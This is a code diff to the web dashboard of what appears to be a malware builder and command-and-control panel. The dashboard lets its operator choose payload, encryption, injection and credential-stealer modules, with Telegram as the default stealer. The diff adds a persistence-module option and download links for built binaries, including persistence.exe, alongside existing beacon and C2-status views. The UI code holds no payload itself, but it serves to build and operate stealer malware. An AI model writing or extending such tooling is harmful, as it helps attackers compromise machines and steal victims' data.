@@ -771,6 +771,10 @@ PEEKABOO</pre>
             <label>stealer</label>
             <select id="f-stealer">{% for s in modules.stealer %}<option value="{{ s }}"{% if s=='telegram' %} selected{% endif %}>{{ s }}</option>{% endfor %}</select>
           </div>
+          <div class="form-row">
+            <label>persistence</label>
+            <select id="f-persistence">{% for r in modules.persistence %}<option value="{{ r }}"{% if r=='none' %} selected{% endif %}>{{ r }}</option>{% endfor %}</select>
+          </div>
 
           <div class="btn-row">
             <button class="btn btn-primary" id="btn-build" onclick="startBuild()">▶ Build</button>
@@ -786,6 +790,10 @@ PEEKABOO</pre>
         <div class="card">
           <div class="card-title"><span class="icon">🖥️</span> Build Output</div>
           <div id="build-output">// build output will appear here...</div>
+          <div id="build-downloads" style="display:none;margin-top:14px;border-top:1px solid var(--sep);padding-top:12px;">
+            <div style="font-size:11px;font-weight:600;color:var(--dim);text-transform:uppercase;letter-spacing:0.6px;margin-bottom:8px;">⬇ Downloads</div>
+            <div id="download-btns" style="display:flex;gap:8px;flex-wrap:wrap;"></div>
+          </div>
         </div>
       </div>
     </div>
@@ -882,7 +890,7 @@ PEEKABOO</pre>
           {% if kb and kb.status == 'ready' %}
             📦 {{ kb.posts }} posts indexed &nbsp;|&nbsp; ~/hacking/cocomelonc.github.io
           {% else %}
-            ⚠️ knowledge base not indexed yet — click to index
+            ⚠️ knowledge base not indexed yet - click to index
           {% endif %}
         </span>
         <button class="btn btn-blue" style="font-size:12px;padding:5px 12px;" onclick="triggerScrape()">↻ Index Codebase</button>
@@ -1002,11 +1010,12 @@ var _currentBuildId = null;
 
 function startBuild() {
   var params = {
-    payload:    document.getElementById('f-payload').value,
-    encryption: document.getElementById('f-encryption').value,
-    malware:    document.getElementById('f-malware').value,
-    injection:  document.getElementById('f-injection').value,
-    stealer:    document.getElementById('f-stealer').value,
+    payload:     document.getElementById('f-payload').value,
+    encryption:  document.getElementById('f-encryption').value,
+    malware:     document.getElementById('f-malware').value,
+    injection:   document.getElementById('f-injection').value,
+    stealer:     document.getElementById('f-stealer').value,
+    persistence: document.getElementById('f-persistence').value,
   };
   document.getElementById('btn-build').disabled = true;
   setStatusBadge('queued');
@@ -1036,9 +1045,31 @@ function pollBuild(id) {
     if (d.status !== 'running' && d.status !== 'queued') {
       clearInterval(_pollInterval); _pollInterval = null;
       document.getElementById('btn-build').disabled = false;
-      if (d.status === 'success') setTimeout(loadBinaryInfo, 1000);
+      if (d.status === 'success') {
+        setTimeout(loadBinaryInfo, 1000);
+        loadBuildDownloads(id);
+      }
     }
   });
+}
+
+function loadBuildDownloads(id) {
+  fetch('/api/build/' + id + '/files')
+  .then(function(r){ return r.json(); })
+  .then(function(d) {
+    var files = d.files || [];
+    if (!files.length) return;
+    var area = document.getElementById('build-downloads');
+    var btns = document.getElementById('download-btns');
+    btns.innerHTML = files.map(function(f) {
+      var cls = f.name === 'persistence.exe' ? 'btn btn-orange' : 'btn btn-green';
+      var label = f.name + ' (' + (f.size / 1024).toFixed(1) + ' KB)';
+      var tech  = f.technique ? ' <span style="font-size:10px;opacity:.7;">[' + escapeHtml(f.technique) + ']</span>' : '';
+      return '<a class="' + cls + '" href="/api/build/' + id + '/download/' + encodeURIComponent(f.name) + '" download="' + escapeHtml(f.name) + '">⬇ ' + escapeHtml(label) + tech + '</a>';
+    }).join('');
+    area.style.display = 'block';
+  })
+  .catch(function(){});
 }
 
 function setStatusBadge(status) {
@@ -1049,7 +1080,13 @@ function setStatusBadge(status) {
 function setOutput(txt)    { document.getElementById('build-output').innerHTML = colorize(txt); }
 function appendOutput(txt) { var el = document.getElementById('build-output'); el.innerHTML += colorize(txt); el.scrollTop = el.scrollHeight; }
 function renderOutput(raw) { var el = document.getElementById('build-output'); el.innerHTML = colorize(raw); el.scrollTop = el.scrollHeight; }
-function clearOutput()     { document.getElementById('build-output').innerHTML = '// cleared.'; document.getElementById('current-build-id').textContent = ''; setStatusBadge('idle'); }
+function clearOutput()     {
+  document.getElementById('build-output').innerHTML = '// cleared.';
+  document.getElementById('current-build-id').textContent = '';
+  document.getElementById('build-downloads').style.display = 'none';
+  document.getElementById('download-btns').innerHTML = '';
+  setStatusBadge('idle');
+}
 
 // ── beacons ────────────────────────────────────────────────────────────────────
 function loadBeacons() {
@@ -1111,7 +1148,7 @@ function loadBinaryInfo() {
   .then(function(d) {
     var el = document.getElementById('binary-info');
     if (!d.found) {
-      el.innerHTML = '⚠️ no built binary found — run the builder first';
+      el.innerHTML = '⚠️ no built binary found - run the builder first';
       el.style.color = 'var(--yellow)';
     } else {
       var kb = (d.size / 1024).toFixed(1);
@@ -1132,7 +1169,7 @@ function loadC2Status() {
       if (!el) return;
       var info = d[ch] || {};
       if (info.ok) {
-        el.innerHTML = '<span class="dot-ok">●</span> online' + (info.name ? ' — ' + escapeHtml(info.name) : '');
+        el.innerHTML = '<span class="dot-ok">●</span> online' + (info.name ? ' - ' + escapeHtml(info.name) : '');
       } else {
         el.innerHTML = '<span class="dot-err">●</span> ' + (info.error ? escapeHtml(info.error) : 'offline');
       }
